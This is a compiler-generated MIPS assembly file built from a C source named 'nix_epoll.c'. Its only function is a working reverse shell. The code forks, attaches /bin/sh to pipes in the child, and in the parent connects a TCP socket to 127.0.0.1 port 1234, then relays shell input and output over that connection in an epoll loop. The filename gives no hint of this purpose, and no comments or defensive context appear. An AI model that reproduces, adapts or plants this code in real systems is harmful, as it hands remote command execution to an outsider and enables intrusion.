	.file	1 "nix_epoll.c"
	.section .mdebug.abi32
	.previous
	.nan	legacy
	.module	fp=xx
	.module	nooddspreg
	.abicalls
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align	2
$LC0:
	.ascii	"/bin/sh\000"
	.section	.text.startup,"ax",@progbits
	.align	2
	.globl	main
	.set	nomips16
	.set	nomicromips
	.ent	main
	.type	main, @function
main:
	.frame	$sp,8328,$31		# vars= 8272, regs= 7/0, args= 16, gp= 8
	.mask	0x803f0000,-4
	.fmask	0x00000000,0
	.set	noreorder
	.cpload	$25
	.set	nomacro
	addiu	$sp,$sp,-8328
	lw	$25,%call16(pipe)($28)
	addiu	$4,$sp,8288
	sw	$31,8324($sp)
	.cprestore	16
	sw	$21,8320($sp)
	sw	$20,8316($sp)
	sw	$19,8312($sp)
	sw	$18,8308($sp)
	sw	$17,8304($sp)
	.reloc	1f,R_MIPS_JALR,pipe
1:	jalr	$25
	sw	$16,8300($sp)

	lw	$28,16($sp)
	lw	$25,%call16(pipe)($28)
	.reloc	1f,R_MIPS_JALR,pipe
1:	jalr	$25
	addiu	$4,$sp,8280

	lw	$28,16($sp)
	lw	$25,%call16(fork)($28)
	.reloc	1f,R_MIPS_JALR,fork
1:	jalr	$25
	nop

	lw	$28,16($sp)
	bne	$2,$0,$L2
	lw	$4,8288($sp)

	lw	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	move	$5,$0

	li	$5,1			# 0x1
	lw	$28,16($sp)
	lw	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	lw	$4,8284($sp)

	li	$5,2			# 0x2
	lw	$28,16($sp)
	lw	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	lw	$4,8284($sp)

	lw	$28,16($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8288($sp)

	lw	$28,16($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8292($sp)

	lw	$28,16($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8280($sp)

	lw	$28,16($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8284($sp)

	move	$6,$0
	lw	$28,16($sp)
	addiu	$5,$sp,8272
	sw	$0,8276($sp)
	lw	$4,%got($LC0)($28)
	lw	$25,%call16(execve)($28)
	addiu	$4,$4,%lo($LC0)
	.reloc	1f,R_MIPS_JALR,execve
1:	jalr	$25
	sw	$4,8272($sp)

	lw	$28,16($sp)
$L14:
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8292($sp)

	lw	$28,16($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8280($sp)

	move	$2,$0
	lw	$31,8324($sp)
	lw	$21,8320($sp)
	lw	$20,8316($sp)
	lw	$19,8312($sp)
	lw	$18,8308($sp)
	lw	$17,8304($sp)
	lw	$16,8300($sp)
	jr	$31
	addiu	$sp,$sp,8328

$L2:
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	move	$19,$2

	lw	$28,16($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8284($sp)

	move	$6,$0
	lw	$28,16($sp)
	li	$5,2			# 0x2
	lw	$25,%call16(socket)($28)
	.reloc	1f,R_MIPS_JALR,socket
1:	jalr	$25
	li	$4,2			# 0x2

	li	$6,16			# 0x10
	move	$16,$2
	lw	$28,16($sp)
	li	$2,2			# 0x2
	addiu	$5,$sp,8216
	sh	$2,8216($sp)
	li	$2,1234			# 0x4d2
	lw	$25,%call16(connect)($28)
	move	$4,$16
	sh	$2,8218($sp)
	li	$2,16777216			# 0x1000000
	addiu	$2,$2,127
	.reloc	1f,R_MIPS_JALR,connect
1:	jalr	$25
	sw	$2,8220($sp)

	lw	$28,16($sp)
	lw	$25,%call16(epoll_create1)($28)
	.reloc	1f,R_MIPS_JALR,epoll_create1
1:	jalr	$25
	move	$4,$0

	lw	$28,16($sp)
	blez	$2,$L4
	move	$17,$2

	lw	$18,8280($sp)
	addiu	$20,$sp,8248
	lw	$25,%call16(epoll_ctl)($28)
	li	$21,1			# 0x1
	li	$5,1			# 0x1
	sw	$16,8264($sp)
	move	$7,$20
	sw	$18,8268($sp)
	move	$6,$16
	sw	$16,8256($sp)
	move	$4,$2
	.reloc	1f,R_MIPS_JALR,epoll_ctl
1:	jalr	$25
	sw	$21,8248($sp)

	li	$5,1			# 0x1
	lw	$28,16($sp)
	move	$7,$20
	sw	$18,8256($sp)
	move	$6,$18
	sw	$21,8248($sp)
	move	$4,$17
	addiu	$20,$sp,8232
	lw	$25,%call16(epoll_ctl)($28)
	.reloc	1f,R_MIPS_JALR,epoll_ctl
1:	jalr	$25
	addiu	$18,$sp,24

	lw	$28,16($sp)
$L8:
	lw	$25,%call16(epoll_wait)($28)
	li	$7,-1			# 0xffffffffffffffff
	li	$6,1			# 0x1
	move	$5,$20
	.reloc	1f,R_MIPS_JALR,epoll_wait
1:	jalr	$25
	move	$4,$17

	blez	$2,$L5
	lw	$28,16($sp)

	lw	$2,8232($sp)
	andi	$3,$2,0x18
	bne	$3,$0,$L5
	andi	$2,$2,0x1

	beq	$2,$0,$L5
	lw	$2,8240($sp)

	li	$6,8192			# 0x2000
	lw	$25,%call16(read)($28)
	bne	$16,$2,$L6
	move	$5,$18

	.reloc	1f,R_MIPS_JALR,read
1:	jalr	$25
	move	$4,$16

	move	$5,$18
	lw	$28,16($sp)
	move	$6,$2
	lw	$4,8292($sp)
$L13:
	lw	$25,%call16(write)($28)
	.reloc	1f,R_MIPS_JALR,write
1:	jalr	$25
	nop

	b	$L8
	lw	$28,16($sp)

$L6:
	.reloc	1f,R_MIPS_JALR,read
1:	jalr	$25
	lw	$4,8280($sp)

	move	$5,$18
	lw	$28,16($sp)
	move	$6,$2
	b	$L13
	move	$4,$16

$L5:
	lw	$25,%call16(epoll_ctl)($28)
	move	$7,$0
	lw	$6,8264($sp)
	li	$5,2			# 0x2
	.reloc	1f,R_MIPS_JALR,epoll_ctl
1:	jalr	$25
	move	$4,$17

	move	$7,$0
	lw	$28,16($sp)
	li	$5,2			# 0x2
	lw	$6,8268($sp)
	lw	$25,%call16(epoll_ctl)($28)
	.reloc	1f,R_MIPS_JALR,epoll_ctl
1:	jalr	$25
	move	$4,$17

	lw	$28,16($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	move	$4,$17

	lw	$28,16($sp)
$L4:
	lw	$25,%call16(kill)($28)
	li	$5,18			# 0x12
	.reloc	1f,R_MIPS_JALR,kill
1:	jalr	$25
	move	$4,$19

	lw	$28,16($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	move	$4,$16

	b	$L14
	lw	$28,16($sp)

	.set	macro
	.set	reorder
	.end	main
	.size	main, .-main
	.ident	"GCC: (Debian 6.3.0-18) 6.3.0 20170516"
